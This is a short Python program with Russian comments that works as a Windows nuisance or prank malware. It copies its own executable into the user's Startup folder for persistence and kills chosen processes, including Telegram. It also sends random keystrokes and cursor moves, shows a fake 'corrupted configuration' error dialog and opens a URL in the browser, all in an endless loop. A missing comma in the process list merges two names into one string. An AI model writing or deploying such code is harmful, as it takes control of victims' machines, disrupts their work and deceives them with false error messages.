from time import sleep
from random import randint
import psutil
import os
import sys
import pyautogui
import webbrowser


def autoload():
    """Ф-ция добавления нашего exe-файла в автозагрузку компьютера"""
    file = sys.argv[0]  # Полный путь к файлу, включая название и расширение
    file_name = os.path.basename(file)  # Название файла без пути
    user_path = os.path.expanduser('~')  # Путь к папке пользователя
    # Проверяем, есть ли exe в автозагрузке, и, если нет, добавляем его туда
    if not os.path.exists(
            f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{file_name}"
    ):
        os.system(
            f'copy "{file}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
        )


def use_keyboard_mouse():
    """Ф-ция, которая рандомно выбирает, нажать сочетание клавиш,
    передвинуть курсор, нажать клавишу 'win' или вывести сообщение об ошибке"""
    sleep(10)
    randvar = randint(0, 3)
    if randvar == 0:
        pyautogui.hotkey('shift', 'alt')
    elif randvar == 1:
        pyautogui.move(randint(100, 1000), randint(100, 1000))
    elif randvar == 2:
        pyautogui.press('win')
    else:
        pyautogui.alert('ERROR: Unable to initialize program due to missing or corrupted configuration file.'
                        'Please reinstall the program and try again.', 'Error')


def kill_process():
    """Ф-ция завершения выбранных процессов"""
    process_list = [
        'someprocesses.exe'
        'Telegram.exe'
    ]

    for process in list(psutil.process_iter()):
        if process.name() in process_list:
            process.terminate()


def search_browser():
    """Ф-ция открытия ввода ссылки в браузере"""
    sleep(30)
    webbrowser.open('your url', new=2)


def main():
    """Главная ф-ция программы"""
    while True:
        autoload()
        sleep(randint(60, 600))
        kill_process()
        use_keyboard_mouse()
        search_browser()


if __name__ == '__main__':  # Точка входа в программу
    main()
